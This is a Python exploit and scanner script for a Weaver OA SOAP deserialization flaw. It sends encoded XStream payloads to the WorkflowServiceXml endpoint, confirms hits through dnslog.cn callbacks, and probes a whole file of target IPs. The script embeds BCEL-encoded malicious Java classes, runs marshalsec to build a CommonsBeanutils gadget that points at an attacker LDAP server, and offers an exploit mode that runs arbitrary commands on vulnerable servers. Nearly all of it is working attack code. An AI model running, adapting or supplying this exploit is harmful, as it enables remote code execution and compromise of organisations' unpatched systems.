# encoding: GBK
import os
import re
import subprocess
from time import sleep

import requests
import warnings
import argparse
from colorama import init

init(autoreset=True)

cookies = {
    "UM_distinctid": "17652fd6c5c18e-0d7e57995faddb8-4c3f2779-151800-17652fd6c5d2c4",
    "CNZZDATA1278305074": "785399890-1607710109-null%7C1620920357",
    "PHPSESSID": "sqrdq25f42sccg5kn3u856os20",
}

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "text/xml;charset=UTF-8",
    "SOAPAction": '""',
    "User-Agent": "Apache-HttpClient/4.1.1 (java 1.5)",
    "Connection": "close",
}

exp_data = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">\n<soapenv:Header/>\n' \
           '<soapenv:Body>\n<web:doCreateWorkflowRequest>\n' \
           '<web:string>\n{payload}' \
           '</web:string>\n' \
           '<web:string>2</web:string>\n' \
           '</web:doCreateWorkflowRequest>\n' \
           '</soapenv:Body>\n</soapenv:Envelope>'

urldns_text = "<map>\n" \
              "<entry>\n" \
              "<url>http://{ip}</url>\n" \
              "<string>http://{ip}</string>\n" \
              "</entry>\n<" \
              "/map>"

def get_cookies(cookie_str: str):
    global cookies
    for i in cookie_str.split(";"):
        cookies[i.split("=")[0].strip()] = i.split("=")[-1].strip()

def get_dns_ip():
    resp = requests.get("http://www.dnslog.cn/getdomain.php?t=0.5165514214063338", cookies=cookies)
    return resp.text.strip()


def get_result():
    resp = requests.get("http://www.dnslog.cn/getrecords.php?t=0.5165514214063338", cookies=cookies)
    if resp.text != "[]":
        return True
    else:
        return False


def get_html_code(char):
    try:
        return ("&#" + str(ord(char)) + ";")
    except:
        print(char)


def get_payload(text):
    payload = ""
    for i in text:
        payload += get_html_code(i)
    return exp_data.format(payload=payload)


def activate_test(ip, cmd=""):
    shell1_file = open("shell1.txt", "r")
    if cmd == "":
        dns_ip = get_dns_ip()
        cmd = f"ping {dns_ip}"
    shell1_text = shell1_file.read().replace(" ", "").format(cmd=cmd)
    shell_payload = get_payload(text=shell1_text)
    urls = ["http://%s/services /WorkflowServiceXml" % ip, "https://%s/services /WorkflowServiceXml" % ip]
    for url in urls:
        try:
            requests.post(url, data=shell_payload, headers=headers, verify=False, timeout=1)
            break
        except:
            pass
    return get_result()


def bcel_test(ip, bcel_string="", cmd=""):
    shell2_file = open("shell2.txt", "r")
    dns_ip = get_dns_ip()
    if bcel_string == "":
        # 延时测试
        shell1_text = shell2_file.read().replace(" ", "").format(
            bcel_string="$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$92$cdN$c2$40$U$85$cf$40K$a1$fc$8a$88$ff$88$ae$90$85$yt$tqc4AQ$X$Q$96$sC$99$c8$60m$9bR$8c$f1$J$7c$T$d7l$d4$b8$f0$B$7c$u$e3$9d$Jj$d88$cd$ccm$cf$bd$f3$dd$d3i$3f$bf$de$3f$A$i$60$c7F$S$cb$s$f4X$7c$b2$b1$82U$Lk6L$ac$5b$d8$b0$b0$c9$90hJOFG$M$f1$dan$8f$c18$f6$H$82$n$df$96$9e$b8$9c$dc$f5E$d8$e5$7d$97$94b$dbw$b8$db$e3$a1T$cf3$d1$88$86r$ccPh$8f$F$e9$ae$7c$U$8d$ae$YG$87$M$c9$a6$e3$ce$c0$8c$K$ab$ed$R$bf$e7$N$97$7b7$8d$96$X$890$9c$E$91$Y$9c$3c8$o$88$a4$ef$d1$8el$t$e2$ce$ed$F$P4$9bl2$d8$j$7f$S$3a$e2T$aa$5e$vE$deS$98$MR$b0$zT2$d8B$95$a1$f2$3f$3a$83m$d8$M$b9y$8bd$fao$dbU$7f$q$9cy$a9$3b$M$F$l0$98cW$88$80$de$b4v$a6$8e$t$l$84$d2$8b$b4$d3n$c8$jAl$8b$ceX$8d$YM$f2$F$864$dd$edSd$U$cd$fa$x$d8T$a73$b4$da$ba$y$N$DY$ba$40$9a$$B$Oy$8aI$U$7e$B$d7T$a9r$f9$Sbo0$9e$91$3c$af$bf$m1$d5b$82$3a$99$88kd$Z$a6V$94$96$o7$ea$9b$e7h$fd$c1$db$d4l$BE$f5$H$d0$b4$QkY$u$Z$94X$d2$ae$ca$dfv$X$fa$be$$$C$A$A")
        shell_payload = get_payload(text=shell1_text)
        urls = ["http://%s/services /WorkflowServiceXml" % ip, "https://%s/services /WorkflowServiceXml" % ip]
        result = False
        for url in urls:
            try:
                resp = requests.post(url, data=shell_payload, headers=headers, verify=False, timeout=10)
                if resp.elapsed.seconds > 5:
                    result = True
                break
            except:
                pass
    else:
        shell1_text = shell2_file.read().replace(" ", "").format(bcel_string=bcel_string)
        shell_payload = get_payload(text=shell1_text)
        headers["potats0"] = "whoami"
        urls = ["http://%s/services /WorkflowServiceXml" % ip, "https://%s/services /WorkflowServiceXml" % ip]
        result = ""
        for url in urls:
            try:
                resp = requests.post(url, data=shell_payload, headers=headers, verify=False, timeout=1)
                result = resp.text
            except:
                pass
    return result


def cbu_test(ip, ldap_ip=""):
    if ldap_ip == "":
        ldap_ip = get_dns_ip() + "/a"
    shell_text = subprocess.Popen(
        f"java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils ldap://{ldap_ip}", shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().decode("UTF-8")
    shell_payload = get_payload(shell_text)
    urls = ["http://%s/services /WorkflowServiceXml" % ip, "https://%s/services /WorkflowServiceXml" % ip]
    for url in urls:
        try:
            requests.post(url, data=shell_payload, headers=headers, verify=False, timeout=1)
            break
        except:
            pass
    return get_result()


def test(ip):
    global vul_ip_list
    global urldns_text
    dns_ip = get_dns_ip()
    urldns_text = urldns_text.format(ip=dns_ip)
    urldns_data = get_payload(text=urldns_text)
    urls = ["http://%s/services%%20/WorkflowServiceXml" % ip, "https://%s/services /WorkflowServiceXml" % ip]
    for url in urls:
        try:
            resp = requests.post(url, data=urldns_data, headers=headers, verify=False, timeout=1)
            break
        except:
            pass
    if get_result():
        print("\033[31m[+] %-30s | VULNERABLE!" % ip)
        vul_ip_list.append(ip)
    else:
        print("\033[00m[-] %-30s | SAFE!" % ip)


def exploit(ip, cmd):
    activate_test(ip, cmd)
    result = bcel_test(ip, bcel_string="$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$d9W$TW$i$fe$G$C3$M$c3b$Qa$5c$b1u$J$w$c1$ee$V$a9$VA$5c$g$d0$g$8a$Vm$ed0$5c$60$m$cc$c4$c9D$90$$v$b3$9b$ddwk$b7$97$k_$db$3eDO$7b$da$d3$87$be$d8S$l$da$3f$a8$f6$bb$93$40$J$89$da$9c$93$7b$e7$fe$eeo$bb$bf$ef$bb$bf$99$3f$fe$f9$e9W$A$f7$e3$5b$j$G$S$3a$G0$a8$e1$88$9c$8f$eax$i$c7$e4$90$d40$a4$e3$J$Mk8$ae$e2I$j$3aN$a8$Y$d1q$S$a7$a4$d9SR$f2$b4$86$d3r$7eF$87$85Q9$d8$g$c6T$I$N$e3$3a$9a1$a1aR$85$a3aJ$c5$b4$8e$Uft$ac$81$ab$c1$93sZ$Og$e4$e0k$c8$a8$It$dc$8d$ac$8a$b3$K$aa$bb$j$d7$J$f6$u$a8$8c$b5$P$x$88$f4zcBAC$c2q$c5$60vfT$f8C$d6h$8a$92h$c2$b3$ad$d4$b0$e5$3br$bd$m$M$ect$c6$b3$a7E$40$fd$e9$de$945$3f$af$60Eb$ca$3aku$a6$yw$a2$93$a2Lf7$V$tD$d0$9b$f5$7d$e1$G$c7$c4$99$ac$c8$E$D$KV$_Q$f4$c5xJ$d8A$e7$80$I$s$bd1Z$d4$dbE$ea2$81$ff$b4$8f$8cNQ$99Z$ca$b8$C$b3$8c$9b$7eG$a4$a4$X$cd$X$99$b4$e7f$98$ab$ce$U$8e$fbN$m$7c$86Vf$V4$e6$ed$i$af3$_$de$9d$d79$u$ac$b1P$a7$d2$9e$Z$x$O$9b$M$7c$c7$9d$90a3$K$9a$f2$h$d9$c0Iu$sm$cbuC$P$K$p5$_1$d9$3fg$8bt$e0x$$$f7$o$c1$a4C$c3$9a$c4x$d6$9e$3e$e7e$v$aaK$G$96$3d$3d$60$a5$c3$82$S$Q$S$40$c5$y$e1W1Gt$J$v$f1$q$60$cc$z$e9e$7d$5b$f4$3b$b2$f0F$c1E$5cF2$b0$F$5bU$9c30$8fg$Z$868$d9$G$9e$c3$f3$w$5e0p$k$_$gx$J$_$x$d8j$7b3q$db$ca$da$93$5e$dc$V$c1$ac$e7O$c7SN$s$Qn$7c$c8N$t$XqT$f1$8a$81Wq$81P$96$c0Fj$yC$d7$c0kx$9d$d5$5c$8e$O$8fa$e0$N$bci$e0$z$5c4$f06$$$d2$f6$f4$C$k$fd$96$cd2$hx$H$ef$f2$a4$G$de$c3$fb$G$3e$c0$87$y$cf$oN$qA1B$KbioV$f8b$acm$f4$5c$5b$da$L$ac$m$e3$b5$95$fd$Z$f8$I$l$e7$9d$e5$B$z$ca0$P$a4$C5$efc$tOZ$C$a6$8aO$M$7c$8a$cfdu$3fWPq$aa$c7$c0$r$7ca$e02$be4$f0$V$beV$A$b2$a0$M$d4$G$be$c1V$3a$_$60$a4$a0$f5V$3cW$d0r$L$ee$$d$U$ee$i$cb$ba$813S$e0$f0$e2$a29$d6$9e$u$d1$914$Ts$c2$s$da$b1R$e6$$58$ea$7b$b6$I$_$e7$92$c2$MM$fa$ac$WyY$b8$7d$L$eb$95E$b1$f2RZ6K$7exn$m$e6$82$90$L$J$__j$b3H$7d$c9$96$b4$v$bbA$a8R$7c$I$r$K6$df$n$f7$85$b6$o$e1$5d$a8$e4$de26$tKl$dao$d7s$aa$j$f7$ac7$cd$d2$ee$8a$956$9b$93$a5$a2$f6r$zI$935$c9$l$a3$a9$b4$M$f2$ceS$n$99M$L$df$cek5r$dd$t$b8$m$af$L$d8w$dc$e1$fc$cb$db$5c$5dF$E$3d$b6$84$d3$J$fbr$q6$o$9by$r$3d$x$d8R$e60e3$af$9a$95$b7L$S$abL$f4$e1$oF$W$c8$c3$h$ca$Q$87$dct6$a0$9e$b0fH$e8$853$f3$d6$$$d9$a0$fb$d6X$d9$N$e9$d9$c8fD$9fH93$f9$5b$7e$h$ea$$k$b7$ea$a4$95$Z$q$fb$c2$d7$d7$I$P$ee$86$8bb$ba$$$b6$ed$864$l$82$b0$e5$O$f9$96$z$b0$R$9b$f9$82$95$3fvn$d9E9$c6$80$8avT$a3$96$d2$bf$b7$5d$85r$N$V$d1$ca$i$o$c7$af$a1$w$87$ea$a8$9a$83$96$d8$k$ad$a9$fc$Fz$O$b5$D$3b$U$3e$Z9$d4$Nv$e4P$9fCC$b41$87$V$5d$R3$S$c9$njF$um$ea$aa2i$5b$l$5dY0$ea$aa6$ab$cd$aa$82$ddoh$eeRM5$ba$w$87$W$e9$o$da$g$a1$d6$89$ca$a8$99$94$aa$9a$a9uP$60P$b0$3a$Z$aa$9b$5d5$3fc$cd$J$sf$d60$b1$i$d6$5e$c5$ba$e8$fa$i6t$e9$a6j2$40$db$r$d4$cay$e3$VTE$ef$a2$df$x2$e7$i6$fd$c0$TFp$j$7f$f2$D$a0$S$ed$3c$e3$m$9a8$g$94$d6$a3$O$N0$d1$88MX$818$a2$e8$e6$de$3e$ac$c4a$7ea$8c$60$V$a6$d0$823h$c5$Fj$5d$c2j$fc$c8$_$8a$ebXOokq$D$eb$f0$X6$60$h$bd$cd$d3$9f$89$ef$b1$j$3b$Yo$T$beC$H$fdU$f0$7f$Z$9d$d8$c9$c8$dd$ec$fc$f7$e0$5eF$3d$cc7$d4$7d$94U1$82$c7O$a58k$3f$85$d3x$A$PBe$a4$3e$3cD$99$c6x$3b$f10v$a1$86Q$5b$d0$85$dd$fc$g$baA$fbn$3c$c2$Y$c4$K$7b$f0$u$e7$bd$fc$3b$88$dc$c4$ef$a8U$d1$a3b$9f$8a$5e$V$7d$w$f6$87$p$9f$fb$c3$f1$80$8a$83P$b8$baI$fb$ff$a1Z$R$ae$O$dcd$a6$b4$ea$91$c3$a1$IM$P3$60$F$k$fb$X$9f$s$83$aa$ec$J$A$A", cmd=cmd)
    if "potatso" in result:
        print(result)
    if ldap_ip != "":
        print(ldap_ip)
        cbu_test(ip, ldap_ip=ldap_ip)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="泛微OA漏洞检测脚本")
    parser.add_argument("-i", "--ip", dest="ip", required=False, help="input the vulnarable ip:port", default="")
    parser.add_argument("-r", "--file", dest="file", required=False, help="input the ip file", default="")
    parser.add_argument("-l", "--ldap", dest="ldap", required=False, help="input the ldap-vps ip:port",
                        default="127.0.0.1")
    parser.add_argument("-c", "--cookies", dest="cookies", required=False, help="input the extra cookies", default="")
    parser.add_argument("--exploit", dest="exp", help="exploit mode", nargs="?", const=True, default=False)
    parser.add_argument("cmd", nargs="*")
    args = parser.parse_args()
    ip = args.ip
    filename = args.file
    extra_cookies = args.cookies
    ldap_ip = args.ldap
    exp = args.exp
    cmd = " ".join(args.cmd)
    if not cookies == "":
        get_cookies(extra_cookies)
    if ip == "" and filename == "":
        parser.print_help()
        exit()
    if exp:
        if ip != "":
            exploit(ip, cmd)
            exit()
            print(1)
        else:
            pass
    vul_ip_list = []
    warnings.filterwarnings("ignore")
    if filename != "":
        file = open("ip.txt", "r")
        for i in file.readlines():
            ip = re.sub("^http.*://", "", i.strip().strip("/"))
            test(ip)
        print("-------------------------------------" * 2)
        print("\033[31m测试完成，存在漏洞ip为[%s]\033[00m" % (",".join(vul_ip_list)))
        print("-------------------------------------" * 2)
    else:
        ip = re.sub("^http.*://", "", ip.strip("/"))
        test(ip)
    if len(vul_ip_list) == 0:
        exit(1)
    print("测试可利用Gadget：\033[00m")
    for i in vul_ip_list:
        print("ip:%s" % i)
        count = 0
        if activate_test(i):
            print("\t\033[31m[+]Gadget Activate is available!")
            count += 1
        if bcel_test(i):
            print("\t\033[31m[+]Gadget Bcel is available!")
            count += 1
        if cbu_test(i):
            print("\t\033[31m[+]Gadget CommonBeanUtils is available!")
            count += 1
        if count == 0:
            print("\t\033[00m[-]No Gadget is available")
